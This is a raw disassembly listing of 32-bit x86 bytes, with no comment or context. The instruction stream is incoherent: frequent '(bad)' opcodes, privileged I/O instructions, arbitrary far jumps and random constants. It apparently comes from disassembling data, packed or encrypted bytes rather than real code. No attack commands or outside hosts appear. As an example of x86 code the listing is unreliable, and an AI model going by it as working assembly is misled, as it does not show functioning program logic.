  41b964:	pop    ebp
  41b965:	clc    
  41b966:	xchg   DWORD PTR [edi-0x23],ebp
  41b969:	pop    esp
  41b96a:	ins    BYTE PTR es:[edi],dx
  41b96b:	repz jmp 0x3740:0x3b7fc016
  41b973:	inc    esi
  41b974:	xchg   DWORD PTR [ebx],esp
  41b976:	pop    es
  41b977:	bound  ebp,QWORD PTR [ebx]
  41b979:	(bad)  
  41b97a:	repz sub eax,0x900f78ac
  41b980:	aaa    
  41b981:	scas   al,BYTE PTR es:[edi]
  41b982:	dec    edi
  41b983:	xchg   DWORD PTR [edi-0x6b27a2bf],esp
  41b989:	mov    ah,0xa1
  41b98b:	xchg   ebp,eax
  41b98c:	sbb    eax,0x82f745da
  41b991:	loopne 0x41b92a
  41b993:	out    0xcc,al
  41b995:	shl    BYTE PTR [esi+0x1d027502],cl
  41b99b:	dec    esp
  41b99c:	pop    ebp
  41b99d:	cli    
  41b99e:	mov    ch,0x87
  41b9a0:	add    al,0xf6
  41b9a2:	mov    eax,0x9e5c34a1
  41b9a7:	jle    0x41b983
  41b9a9:	retf   
  41b9aa:	xor    ch,BYTE PTR [esi]
  41b9ac:	lods   eax,DWORD PTR ds:[esi]
  41b9ad:	loop   0x41b9ea
  41b9af:	xlat   BYTE PTR ds:[ebx]
  41b9b0:	inc    ebp
  41b9b1:	sub    BYTE PTR [esi-0x48],bl
  41b9b4:	sbb    DWORD PTR [ebp+0x507dbe97],edx
  41b9ba:	int3   
  41b9bb:	mov    bl,dh
  41b9bd:	idiv   BYTE PTR [ebp+0x5f]
  41b9c0:	(bad)  
  41b9c2:	push   cs
  41b9c3:	retf   0x7b6
  41b9c6:	rcl    BYTE PTR [edi-0x42],cl
  41b9c9:	inc    ebx
  41b9ca:	mov    ebp,0x1c22461b
  41b9cf:	pop    ss
  41b9d0:	mov    edx,0xaebded00
  41b9d5:	ins    DWORD PTR es:[edi],dx
  41b9d6:	xchg   edi,eax
  41b9d7:	inc    ebp
  41b9d8:	jmp    0x4f9:0x75248db1
  41b9df:	jmp    0x4184:0x9de454bf
  41b9e6:	cmp    eax,0x97f30287
  41b9eb:	sti    
  41b9ec:	mov    ebp,0x11cc45c9
  41b9f1:	adc    bl,BYTE PTR [ebx]
  41b9f3:	push   eax
  41b9f4:	outs   dx,DWORD PTR ds:[esi]
  41b9f5:	data16 xor al,0x88
  41b9f8:	xchg   ebp,eax
  41b9f9:	fldcw  WORD PTR [ebp-0x66cc9524]
  41b9ff:	push   edx
  41ba00:	aaa    
  41ba01:	add    eax,0x75684e16
  41ba06:	idiv   DWORD PTR [ebp-0xe]
  41ba09:	and    edi,DWORD PTR [esi+0x7aece5da]
  41ba0f:	xchg   DWORD PTR [edx+0x27],edx
  41ba12:	into   
  41ba13:	ret    
  41ba14:	in     al,0xc7
  41ba16:	mov    cl,0x5a
  41ba18:	push   ds
  41ba19:	mov    esp,0xd36c5a16
  41ba1e:	fs daa 
  41ba20:	sbb    BYTE PTR [eax+0x67],al
  41ba23:	std    
  41ba24:	or     cl,ch
  41ba26:	lods   al,BYTE PTR ds:[esi]
  41ba27:	stos   BYTE PTR es:[edi],al
  41ba28:	popa   
  41ba29:	ret    0xb597
  41ba2c:	pusha  
  41ba2d:	jb     0x41ba2e
  41ba2f:	(bad)  
  41ba30:	aam    0xef
  41ba32:	shl    DWORD PTR [esi+esi*2-0x4678af7e],1
  41ba39:	call   0xff91:0x69dd3e87
  41ba40:	mov    ds:0x8675212a,eax
  41ba45:	jns    0x41ba23
  41ba47:	xchg   ebx,eax
  41ba48:	pop    ecx
  41ba49:	push   0x368718da
  41ba4e:	cmc    
  41ba4f:	xchg   edi,eax
  41ba50:	sub    edx,DWORD PTR [ecx+0x253886b4]
  41ba56:	(bad)  
  41ba57:	mov    esi,0x6d9885e2
  41ba5c:	mov    bh,0xf2
  41ba5e:	pop    edx
  41ba5f:	cmp    eax,0xf6020814
  41ba64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba65:	mov    edi,0x2a0caacb
  41ba6a:	add    BYTE PTR [edi+0x6648f031],0xdd
  41ba71:	adc    eax,0x569b44d
  41ba76:	das    
  41ba77:	call   0xfcf7fb47
  41ba7c:	ss push esp
  41ba7e:	lods   al,BYTE PTR ds:[esi]
  41ba7f:	xchg   esi,eax
  41ba80:	xchg   ebx,eax
  41ba81:	mov    ebp,0xbba79397
  41ba86:	push   ecx
  41ba87:	pop    es
  41ba88:	stos   BYTE PTR es:[edi],al
  41ba89:	push   edx
  41ba8a:	out    0xed,eax
  41ba8c:	test   BYTE PTR [edx-0x61],al
  41ba8f:	jb     0x41baa8
  41ba91:	sub    al,0x55
  41ba93:	push   ds
  41ba94:	mov    ebp,0xddd4acf5
  41ba99:	fdiv   st,st(0)
  41ba9b:	loop   0x41baa5
  41ba9d:	cwde   
  41ba9e:	push   0xffffffc3
  41baa0:	push   es
  41baa1:	pop    edi
  41baa2:	popf   
  41baa3:	jns    0x41ba7b
  41baa5:	add    cl,bl
  41baa7:	cmp    al,0x4d
  41baa9:	sub    BYTE PTR [ebp-0x74],ah
  41baac:	fnsave [eax+0x44]
  41baaf:	das    
  41bab0:	xor    ebx,edi
  41bab2:	arpl   WORD PTR [ebx+0x1c0fcffb],bx
  41bab8:	xchg   esi,eax
  41bab9:	inc    ecx
  41baba:	jo     0x41bab3
  41babc:	pop    edi
  41babd:	mov    dh,0xd5
  41babf:	int3   
  41bac0:	and    BYTE PTR [edi+eiz*8],bh
  41bac3:	jno    0x41baa2
  41bac5:	jnp    0x41baaf
  41bac7:	pop    ecx
  41bac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bac9:	mov    bl,0x64
  41bacb:	shl    DWORD PTR [ecx+0x47],cl
  41bace:	jge    0x41bae6
  41bad0:	push   ecx
  41bad1:	ret    0xd45
  41bad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bad5:	aad    0x39
  41bad7:	xlat   BYTE PTR ds:[ebx]
  41bad8:	in     al,0x40
  41bada:	mov    ecx,0x481cbd57
  41badf:	add    ah,dh
  41bae1:	(bad)  
  41bae2:	retf   
  41bae3:	sub    al,0x5d
  41bae5:	out    0x5b,eax
  41bae7:	inc    esp
  41bae8:	or     bl,BYTE PTR [eax]
  41baea:	cwde   
  41baeb:	or     al,BYTE PTR [eax+0x5d975db7]
  41baf1:	jmp    0xdf435d9
  41baf6:	dec    edx
  41baf7:	mov    BYTE PTR [edi+0x5d],al
  41bafa:	loopne 0x41bb59
  41bafc:	pop    es
  41bafd:	es cwde 
  41baff:	push   edx
  41bb00:	pop    esi
  41bb01:	stc    
  41bb02:	mov    cs,esi
  41bb04:	dec    esi
  41bb05:	fwait
  41bb06:	js     0x41ba98
  41bb08:	push   esi
  41bb09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb0a:	push   es
  41bb0b:	xchg   DWORD PTR [ebp+eiz*1+0x3eddcc8c],ebp
  41bb12:	pusha  
  41bb13:	xor    al,0x88
  41bb15:	icebp  
  41bb16:	ficomp DWORD PTR [edi-0xa]
  41bb19:	aas    
  41bb1a:	dec    esp
  41bb1b:	stc    
  41bb1c:	loopne 0x41bb3b
  41bb1e:	fimul  DWORD PTR [ebp+0x2797ea5d]
  41bb24:	std    
  41bb25:	in     eax,0xff
  41bb27:	jno    0x41bb40
  41bb29:	push   ss
  41bb2a:	jno    0x41bb6d
  41bb2c:	dec    edx
  41bb2d:	pop    ds
  41bb2e:	cwde   
  41bb2f:	ror    BYTE PTR [esp+eiz*8+0x46],0x27
  41bb34:	mov    al,0xc9
  41bb36:	out    0xea,eax
  41bb38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb39:	mov    ch,0x97
  41bb3b:	push   esi
  41bb3c:	sar    BYTE PTR [edx-0x439a26c0],cl
  41bb42:	xor    edx,DWORD PTR [esi]
  41bb44:	pop    esi
  41bb45:	or     bl,dh
  41bb47:	xchg   cl,cl
  41bb49:	add    DWORD PTR [edi-0x66c71f6b],0x2387d04d
  41bb53:	xchg   esp,eax
  41bb54:	das    
  41bb55:	inc    edi
  41bb56:	retf   0x9366
  41bb59:	aam    0xf9
  41bb5b:	xchg   cl,al
  41bb5d:	inc    ebp
  41bb5e:	and    al,0xa4
  41bb60:	ffree  st(7)
  41bb62:	add    al,0x39
  41bb64:	adc    al,0x20
  41bb66:	jno    0x41bb74
  41bb68:	fstp   TBYTE PTR [edi+0x6240cc4]
  41bb6e:	xacquire xchg BYTE PTR [ebx-0x12],al
  41bb72:	or     dl,BYTE PTR [edi]
  41bb74:	fisubr WORD PTR [ecx]
  41bb76:	mov    dl,0xfe
  41bb78:	mov    eax,0x1de5fbb5
  41bb7d:	fistp  QWORD PTR [ebx]
  41bb7f:	jl     0x41bbb7
  41bb81:	inc    eax
  41bb82:	scas   al,BYTE PTR es:[edi]
  41bb83:	xor    bl,ah
  41bb85:	add    esp,eax
  41bb87:	pop    esi
  41bb88:	jmp    0x84cb:0x807a9777
  41bb8f:	test   al,0xc
  41bb91:	dec    edi
  41bb92:	aam    0x71
  41bb94:	adc    BYTE PTR [ecx+0x7b08883b],al
  41bb9a:	cmp    ah,bl
  41bb9c:	inc    eax
  41bb9d:	neg    BYTE PTR [edx-0x119dea1a]
  41bba3:	dec    edi
  41bba4:	in     eax,0xbf
  41bba6:	pop    ebp
  41bba7:	mov    ah,0x71
  41bba9:	inc    eax
  41bbaa:	and    eax,0xbe1b6964
  41bbaf:	mov    WORD PTR [ebx+ebp*8+0x21c5e597],?
  41bbb6:	jge    0x41bb4f
  41bbb8:	cmp    esi,DWORD PTR [edx+edi*1-0x7fbc2633]
  41bbbf:	stc    
  41bbc0:	cmp    al,BYTE PTR [edx-0x46]
  41bbc3:	cld    
  41bbc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbc5:	adc    al,0xf0
  41bbc7:	sub    al,0xdd
  41bbc9:	test   ebx,edi
  41bbcb:	lods   eax,DWORD PTR ds:[esi]
  41bbcc:	clc    
  41bbcd:	xor    cl,BYTE PTR [esi+0x625c3cbd]
  41bbd3:	cmp    ch,BYTE PTR [eax]
  41bbd5:	inc    eax
  41bbd6:	mov    eax,ds:0x22bb39a4
  41bbdb:	clc    
  41bbdc:	fnsave [ebx+0x76]
  41bbdf:	or     al,0xbe
  41bbe1:	faddp  st(6),st
  41bbe3:	stc    
  41bbe4:	or     BYTE PTR [eax-0x1a],al
  41bbe7:	xchg   ecx,eax
  41bbe8:	rcl    DWORD PTR [esi+0x36],0x7e
  41bbec:	sbb    edi,DWORD PTR [edx]
  41bbee:	cwde   
  41bbef:	push   ebp
  41bbf0:	pop    edx
  41bbf1:	sub    al,0x28
  41bbf3:	fisub  DWORD PTR [edi+0x964e0d1]
  41bbf9:	cmp    BYTE PTR [esi-0x72],cl
  41bbfc:	adc    eax,0xa3fc1fd0
  41bc01:	pop    esp
  41bc02:	xchg   edi,eax
  41bc03:	jl     0x41bc16
  41bc05:	push   ss
  41bc06:	xchg   edx,eax
  41bc07:	stc    
  41bc08:	(bad)  
  41bc09:	mov    ds:0x4aed0dd0,eax
  41bc0e:	int    0x86
  41bc10:	aad    0x26
  41bc12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc13:	vpavgb ymm7,ymm4,YMMWORD PTR [ecx+0x14]
  41bc18:	xor    DWORD PTR [eax+eiz*4+0x25],0xb
  41bc1d:	inc    eax
  41bc1e:	mov    ebp,0xcf7c8d32
  41bc23:	sti    
  41bc24:	adc    al,0x53
  41bc26:	xchg   edi,eax
  41bc27:	mov    eax,0xac5c8e9b
  41bc2c:	scas   eax,DWORD PTR es:[edi]
  41bc2d:	lahf   
  41bc2e:	fsub   QWORD PTR [edi]
  41bc30:	fist   WORD PTR [esi+0x7ad686eb]
  41bc36:	das    
  41bc37:	sbb    ebp,ebx
  41bc39:	faddp  st(1),st
  41bc3b:	loopne 0x41bc96
  41bc3d:	std    
  41bc3e:	ret    0xedf7
  41bc41:	inc    edx
  41bc42:	jp     0x41bcaa
  41bc44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc45:	jne    0x41bc56
  41bc47:	pop    esi
  41bc48:	lds    ebp,FWORD PTR ds:0x93f351dc
  41bc4e:	les    ebp,FWORD PTR [edx]
  41bc50:	(bad)  
  41bc52:	cwde   
  41bc53:	fwait
  41bc54:	syscall 
  41bc56:	nop
  41bc57:	test   BYTE PTR [ebp-0x143a0fd9],dl
  41bc5d:	pop    ecx
  41bc5e:	iretw  
  41bc60:	mov    ebp,0xa9d419c7
  41bc65:	add    DWORD PTR [eax-0x37a06b23],ebx
  41bc6b:	frstpm(287 only) 
  41bc6d:	call   0xa7a25436
  41bc72:	nop
  41bc73:	mov    fs,WORD PTR [eax]
  41bc75:	mov    al,0x98
  41bc77:	or     ch,BYTE PTR [ebp+0x1b]
  41bc7a:	cwde   
  41bc7b:	jecxz  0x41bc4f
  41bc7d:	adc    DWORD PTR [ebp-0x124b3daa],edi
  41bc83:	xchg   esi,eax
  41bc84:	push   ss
  41bc85:	fwait
  41bc86:	xchg   edi,eax
  41bc87:	ret    0xe436
  41bc8a:	je     0x41bc68
  41bc8c:	mov    ch,0xc3
  41bc8e:	lea    edx,[ebp+ebx*8-0x4079e8ef]
  41bc95:	inc    BYTE PTR [esp+eax*2-0x6e]
  41bc99:	cmp    BYTE PTR ds:0x154023ed,al
  41bc9f:	ja     0x41bcde
  41bca1:	push   ds
  41bca2:	lahf   
  41bca3:	lods   al,BYTE PTR ds:[esi]
  41bca4:	test   cl,bh
  41bca6:	xchg   edi,eax
  41bca7:	cwde   
  41bca8:	jecxz  0x41bcdb
  41bcaa:	cmc    
  41bcab:	pusha  
  41bcac:	push   ss
  41bcad:	mov    edx,DWORD PTR [ebx]
  41bcaf:	add    DWORD PTR [edi-0x2678e07f],ebx
  41bcb5:	fstp   TBYTE PTR [ecx]
  41bcb7:	in     eax,0x8d
  41bcb9:	repz cwde 
  41bcbb:	call   0x6e54639f
  41bcc0:	sub    eax,0xc99ec901
  41bcc5:	push   edi
  41bcc6:	retf   0x6702
  41bcc9:	lock cmc 
  41bccb:	xchg   BYTE PTR ds:0x56fc998c,dl
  41bcd1:	mov    BYTE PTR [edi-0x4513f16f],dl
  41bcd7:	sahf   
  41bcd8:	xor    esp,DWORD PTR [edx-0x11]
  41bcdb:	fdiv   DWORD PTR [ebp+0x2d]
  41bcde:	pop    ss
  41bcdf:	xchg   ecx,ebp
  41bce1:	dec    ecx
  41bce2:	push   es
  41bce3:	in     eax,dx
  41bce4:	(bad)  
  41bce6:	sbb    eax,0x1805a78d
  41bceb:	cli    
  41bcec:	mov    ch,0x2
  41bcee:	mov    ch,0xae
  41bcf0:	add    ebp,DWORD PTR [edi-0x7]
  41bcf3:	mov    eax,edi
  41bcf5:	arpl   WORD PTR [edi+0x73],bp
  41bcf8:	repnz enter 0xbaa5,0x87
  41bcfd:	fstp   QWORD PTR [edx]
  41bcff:	cmp    al,0xff
  41bd01:	stc    
  41bd02:	popf   
  41bd03:	push   es
  41bd04:	ret    0xf68c
  41bd07:	push   edx
  41bd08:	fnstsw WORD PTR [ebp+0x5614c074]
  41bd0e:	popa   
  41bd0f:	jbe    0x41bd1e
  41bd11:	sbb    ebx,DWORD PTR [esi+0x6f]
  41bd14:	jne    0x41bd29
  41bd16:	mov    edx,0x3e16057c
  41bd1b:	xchg   DWORD PTR [ecx-0x22bdaedc],esi
  41bd21:	xchg   esi,eax
  41bd22:	mov    dh,0x8d
  41bd24:	xchg   edx,eax
  41bd25:	cmp    eax,0x4008c95e
  41bd2a:	sbb    BYTE PTR [ecx-0x6d7be8e4],dl
  41bd30:	xchg   ecx,eax
  41bd31:	popf   
  41bd32:	xchg   edi,eax
  41bd33:	aad    0x6f
  41bd35:	and    al,BYTE PTR [eax-0x55]
  41bd38:	lods   eax,DWORD PTR ds:[esi]
  41bd39:	mov    al,ah
  41bd3b:	ret    0xacca
  41bd3e:	push   esi
  41bd3f:	xchg   DWORD PTR [ebx-0x148f6517],edi
  41bd45:	or     bh,BYTE PTR [eax]
  41bd47:	test   BYTE PTR [esi-0x60],ch
  41bd4a:	mov    ah,0x1a
  41bd4c:	dec    eax
  41bd4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd4e:	loop   0x41bd81
  41bd50:	fadd   st,st(7)
  41bd52:	pusha  
  41bd53:	xchg   DWORD PTR ds:0xcd4290fe,edi
  41bd59:	adc    DWORD PTR [eax-0x4fcdf971],ebx
  41bd5f:	add    eax,DWORD PTR [ebp-0x71]
  41bd62:	lahf   
  41bd63:	fild   WORD PTR [esi-0x34]
  41bd66:	inc    ecx
  41bd67:	scas   eax,DWORD PTR es:[edi]
  41bd68:	out    dx,al
  41bd69:	pop    ebx
  41bd6a:	cli    
  41bd6b:	call   DWORD PTR [ebx]
  41bd6d:	rol    BYTE PTR [edx+0x42],0xad
  41bd71:	imul   esi,DWORD PTR [ebx-0x10c61f28],0xb32bd402
  41bd7b:	outs   dx,BYTE PTR ds:[esi]
  41bd7c:	push   0x824721b2
  41bd81:	mov    edx,0x603ddea6
  41bd86:	jp     0x41bd63
  41bd88:	jle    0x41bd94
  41bd8a:	push   0x16684126
  41bd8f:	imul   ebx,DWORD PTR [edx],0xffffffdc
  41bd92:	push   ecx
  41bd93:	cmp    al,0x58
  41bd95:	dec    edx
  41bd96:	int    0x87
  41bd98:	fisttp WORD PTR [edi]
  41bd9a:	test   bl,bh
  41bd9c:	fild   DWORD PTR [eax+0x4d]
  41bd9f:	or     ebx,DWORD PTR [ecx-0x3a9b4d58]
  41bda5:	stos   BYTE PTR es:[edi],al
  41bda6:	xchg   edi,eax
  41bda7:	mov    al,ds:0x7eb8fd90
  41bdac:	pop    gs
  41bdae:	(bad)  
  41bdaf:	mov    esp,0x870640e7
  41bdb4:	fidivr DWORD PTR [edx]
  41bdb6:	iret   
  41bdb7:	adc    cl,cl
  41bdb9:	pop    eax
  41bdba:	xchg   edi,eax
  41bdbb:	ret    0x8eaa
  41bdbe:	and    esp,ebx
  41bdc0:	pop    es
  41bdc1:	cdq    
  41bdc2:	jge    0x41bde7
  41bdc4:	pushf  
  41bdc5:	jo     0x41bd5e
  41bdc7:	ret    
  41bdc8:	pop    edx
  41bdc9:	push   esi
  41bdca:	mov    esp,0x9919fa5d
  41bdcf:	(bad)  
  41bdd0:	outs   dx,DWORD PTR ds:[esi]
  41bdd1:	cmp    al,0x34
  41bdd3:	and    dl,BYTE PTR [edx-0x3f]
  41bdd6:	(bad)  
  41bdd7:	jecxz  0x41bdda
  41bdd9:	mov    edx,0xa299239a
  41bdde:	in     al,dx
  41bddf:	xchg   BYTE PTR [edi],ah
  41bde1:	lahf   
  41bde2:	aad    0xa0
  41bde4:	(bad)  [ecx]
  41bde6:	and    BYTE PTR [eax+0x61e03358],dh
  41bdec:	mov    al,BYTE PTR [ebx-0x47]
  41bdef:	adc    ah,BYTE PTR [eax+edi*2+0x37852c7a]
  41bdf6:	xor    eax,DWORD PTR [ebp+0x11da81dd]
  41bdfc:	jecxz  0x41be33
  41bdfe:	or     eax,0x314039c2
  41be03:	or     eax,0x3e7dd189
  41be08:	in     al,0xaf
  41be0a:	xchg   edi,eax
  41be0b:	clc    
  41be0c:	fimul  WORD PTR [ebx]
  41be0e:	mov    bh,0x38
  41be10:	xor    ecx,eax
  41be12:	inc    ecx
  41be13:	fisubr WORD PTR [edx-0x6ce09ac0]
  41be19:	xchg   ecx,eax
  41be1a:	xchg   ebp,eax
  41be1b:	mov    al,0xf1
  41be1d:	mov    dl,0x9e
  41be1f:	inc    ebx
  41be20:	in     al,0x10
  41be22:	fsub   DWORD PTR [esi-0x23]
  41be25:	rep stos BYTE PTR es:[edi],al
  41be27:	das    
  41be28:	outs   dx,DWORD PTR ds:[esi]
  41be29:	inc    eax
  41be2a:	or     DWORD PTR [edx-0x49],0xffffffbf
  41be2e:	add    edx,DWORD PTR ds:0x139b022f
  41be34:	jmp    0xfb95d411
  41be39:	lock addr16 jns 0x41be02
  41be3d:	and    al,0xe5
  41be3f:	rcl    DWORD PTR [ebx],1
  41be41:	(bad)  
  41be43:	mov    ds:0xc76a15e5,al
  41be48:	dec    al
  41be4a:	sahf   
  41be4b:	inc    DWORD PTR [ebp-0x23]
  41be4e:	pop    eax
  41be4f:	les    ecx,FWORD PTR [ebp-0x29]
  41be52:	or     BYTE PTR [ebx-0x3b],ah
  41be55:	mov    ecx,0x57db690b
  41be5a:	mov    edx,DWORD PTR [esi-0xc85ad43]
  41be60:	neg    DWORD PTR [edx]
  41be62:	cwde   
  41be63:	push   esp
  41be64:	xchg   DWORD PTR ds:0x45c777d2,edx
  41be6a:	scas   eax,DWORD PTR es:[edi]
  41be6b:	pusha  
  41be6c:	inc    eax
  41be6d:	rcl    BYTE PTR [ebx-0x5c04b579],1
  41be73:	imul   esp,eax,0xffffffe1
  41be76:	rcl    dh,1
  41be78:	scas   eax,DWORD PTR es:[edi]
  41be79:	dec    ebp
  41be7a:	mov    edx,0xd7f0a012
  41be7f:	push   cs
  41be80:	outs   dx,DWORD PTR ds:[esi]
  41be81:	cdq    
  41be82:	out    dx,al
  41be83:	xchg   BYTE PTR [edi+0xf],bl
  41be86:	and    cl,0xdd
  41be89:	sub    BYTE PTR [edi+0x1b],cl
  41be8c:	inc    esp
  41be8d:	xlat   BYTE PTR ds:[ebx]
  41be8e:	int    0xaa
  41be90:	inc    esi
  41be91:	inc    eax
  41be92:	shl    eax,0x12
  41be95:	test   al,0xe0
  41be97:	jne    0x41bf16
  41be99:	cmp    DWORD PTR [eax+0x3e21956],ebx
  41be9f:	push   esp
  41bea0:	mov    cl,0x26
  41bea2:	xor    BYTE PTR [eax+0x14],dh
  41bea5:	stos   DWORD PTR es:[edi],eax
  41bea6:	cdq    
  41bea7:	xchg   dh,bl
  41bea9:	inc    ebp
  41beaa:	retf   
  41beab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beac:	fst    st(5)
  41beae:	mov    ebp,0xf01e0e16
  41beb3:	cld    
  41beb4:	add    BYTE PTR [eax-0x1d],0xd1
  41beb8:	pop    ebp
  41beb9:	mov    ecx,0x51d291e5
  41bebe:	xchg   edi,eax
  41bebf:	(bad)  
  41bec0:	jo     0x41be84
  41bec2:	in     al,dx
  41bec3:	sub    BYTE PTR [ecx+0x5b],ch
  41bec6:	pop    ds
  41bec7:	xor    edx,DWORD PTR [ecx+ebp*4+0x12]
  41becb:	xchg   ebp,eax
  41becc:	in     al,0x8f
  41bece:	or     DWORD PTR [edi],ebx
  41bed0:	scas   eax,DWORD PTR es:[edi]
  41bed1:	sbb    DWORD PTR [eax-0x313e2299],eax
  41bed7:	into   
  41bed8:	and    ecx,DWORD PTR [ecx]
  41beda:	lods   al,BYTE PTR ds:[esi]
  41bedb:	cmc    
  41bedc:	cdq    
  41bedd:	inc    eax
  41bede:	inc    ebp
  41bedf:	ds (bad) 
  41bee1:	jl     0x41be9b
  41bee3:	test   eax,0x5c934ce6
  41bee8:	fisub  WORD PTR [esi+0x1c0311b7]
  41beee:	sub    bl,bl
  41bef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bef1:	sub    al,0xed
  41bef3:	mov    ds:0x1cbd053,eax
  41bef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bef9:	test   BYTE PTR [esi],ah
  41befb:	mov    ch,dl
  41befd:	(bad)  
  41befe:	paddd  mm7,QWORD PTR [edx-0x6fa567d2]
  41bf05:	and    al,0x3f
  41bf07:	rol    BYTE PTR [eax],0x7b
  41bf0a:	lods   eax,DWORD PTR ds:[esi]
  41bf0b:	mov    bh,0xd0
  41bf0d:	inc    edx
  41bf0e:	cmp    DWORD PTR [edi-0x79618744],ebp
  41bf14:	and    ch,BYTE PTR [edx-0x5f221c0b]
  41bf1a:	and    al,0x3a
  41bf1c:	aas    
  41bf1d:	fmul   DWORD PTR [ebp-0x39]
  41bf20:	sub    DWORD PTR [ebp+eiz*1-0x3c],0xffffff9e
  41bf25:	inc    eax
  41bf26:	nop
  41bf27:	mov    esi,0x23dff350
  41bf2c:	ffree  st(1)
  41bf2e:	sbb    ah,BYTE PTR [edx-0x5a]
  41bf31:	fs clc 
  41bf33:	(bad)  
  41bf34:	neg    edi
  41bf36:	inc    esi
  41bf37:	jns    0x41bf82
  41bf39:	inc    eax
  41bf3a:	stos   BYTE PTR es:[edi],al
  41bf3b:	xchg   ecx,eax
  41bf3c:	mov    BYTE PTR [edi-0x58],bl
  41bf3f:	mov    ebp,0xee1643f4
  41bf44:	push   ebp
  41bf45:	inc    ebp
  41bf46:	lds    esi,FWORD PTR [edx-0x23687fbf]
  41bf4c:	mov    eax,ds:0x2ae62cfb
  41bf51:	inc    eax
  41bf52:	outs   dx,BYTE PTR ds:[esi]
  41bf53:	and    al,0x76
  41bf55:	adc    DWORD PTR [ecx],ebx
  41bf57:	jbe    0x41bf5d
  41bf59:	je     0x41bf2e
  41bf5b:	push   ds
  41bf5c:	push   0xffffffc0
  41bf5e:	push   edi
  41bf5f:	and    DWORD PTR [ebp+0x5a9ee98e],0x1a13709c
  41bf69:	jne    0x41bf02
  41bf6b:	sbb    BYTE PTR [ecx+0x1a],0xeb
  41bf6f:	icebp  
  41bf70:	fmul   QWORD PTR [ecx]
  41bf72:	cwde   
  41bf73:	jnp    0x41bfd0
  41bf75:	aam    0xfe
  41bf77:	cdq    
  41bf78:	pop    esp
  41bf79:	cmp    al,0x3f
  41bf7b:	lea    ebp,[eax+eax*2]
  41bf7e:	xor    eax,0x1b1b875
  41bf83:	mov    ds:0x2f975595,eax
  41bf88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf89:	xor    al,0x93
  41bf8b:	mov    dh,ah
  41bf8d:	fimul  WORD PTR [ebp+0x6e938c5a]
  41bf93:	xchg   DWORD PTR [edx-0x226e7548],ecx
  41bf99:	ficomp DWORD PTR [ebp+0x2bad7ab]
  41bf9f:	scas   al,BYTE PTR es:[edi]
  41bfa0:	dec    edx
  41bfa1:	inc    eax
  41bfa2:	adc    BYTE PTR [ebp+esi*8+0x41],dl
  41bfa6:	inc    ebx
  41bfa7:	mov    ecx,0x40502cb3
  41bfac:	(bad)  
  41bfae:	or     ebp,eax
  41bfb0:	repz shr BYTE PTR [ebx+0x26],cl
  41bfb4:	sbb    BYTE PTR [eax-0x11],al
  41bfb7:	arpl   WORD PTR [edi+0x61],bp
  41bfba:	xchg   ecx,eax
  41bfbb:	outs   dx,DWORD PTR ds:[esi]
  41bfbc:	inc    ebx
  41bfbd:	or     eax,0xa8d0b39f
  41bfc2:	not    BYTE PTR [edx-0x13]
  41bfc5:	stos   DWORD PTR es:[edi],eax
  41bfc6:	fcomip st,st(1)
  41bfc8:	js     0x41bf84
  41bfca:	test   ebp,edx
  41bfcc:	jmp    0x7874:0x8d876ced
  41bfd3:	rcr    bh,0x6a
  41bfd6:	call   0x2844c13
  41bfdb:	sub    eax,0xe7148bac
  41bfe0:	jl     0x41bf7a
  41bfe2:	inc    edi
  41bfe3:	xchg   DWORD PTR [eax-0x222eb31b],esi
  41bfe9:	dec    ecx
  41bfea:	es pop eax
  41bfec:	iret   
  41bfed:	dec    BYTE PTR [ecx]
  41bfef:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41bff1:	inc    eax
  41bff2:	aam    0xb3
  41bff4:	jno    0x41c075
  41bff6:	fmul   DWORD PTR [esi-0x36]
  41bff9:	push   ebx
  41bffa:	lods   eax,DWORD PTR ds:[esi]
  41bffb:	cwde   
  41bffc:	ficom  DWORD PTR [edx+0x4ed33497]
  41c002:	(bad)  ds:0x4156b732
  41c008:	mov    dl,0xea
  41c00a:	pop    DWORD PTR [edi-0x45b9af49]
  41c010:	push   ebx
  41c011:	fist   DWORD PTR [edi+0x2abf1574]
  41c017:	push   cs
  41c018:	loope  0x41c03d
  41c01a:	fnstcw WORD PTR [esi]
  41c01c:	ja     0x41c05f
  41c01e:	mov    WORD PTR [ecx+0x4a],gs
  41c021:	mov    edx,0x3ca28338
  41c026:	mov    esi,0x95e6de37
  41c02b:	jb     0x41bfec
  41c02d:	xchg   edi,eax
  41c02e:	scas   al,BYTE PTR es:[edi]
  41c02f:	xor    eax,0xdeb7eba2
  41c034:	scas   eax,DWORD PTR es:[edi]
  41c035:	mov    esp,0x4dd9b0be
  41c03a:	push   eax
  41c03b:	xchg   DWORD PTR [esi+0x66],eax
  41c03e:	int3   
  41c03f:	aam    0xe4
  41c041:	push   eax
  41c042:	or     esp,DWORD PTR [edx-0x2]
  41c045:	repnz pop eax
  41c047:	out    0xae,al
  41c049:	ret    
  41c04a:	mov    ebx,0x2440c5a2
  41c04f:	sahf   
  41c050:	dec    edi
  41c051:	loop   0x41c016
  41c053:	push   ds
  41c054:	sub    edx,DWORD PTR [ebp-0x7c]
  41c057:	push   eax
  41c058:	mov    ebx,0x1fa69e74
  41c05d:	sbb    eax,0x679d12ae
  41c062:	ja     0x41c02f
  41c064:	mov    BYTE PTR [eax-0x3],0x7c
  41c068:	pop    ebx
  41c069:	fstp   QWORD PTR [ecx+0x2]
  41c06c:	loopne 0x41c027
  41c06e:	xchg   edi,eax
  41c06f:	mov    eax,0x686867e8
  41c074:	mov    ecx,0x534a1b9d
  41c079:	cmp    eax,0x2cc0a57d
  41c07e:	pop    DWORD PTR [edi-0x3f61b13c]
  41c084:	inc    ebp
  41c085:	inc    edx
  41c086:	sub    al,0xfc
  41c088:	pop    ebp
  41c089:	dec    ecx
  41c08a:	ss push edi
  41c08c:	loope  0x41c0cd
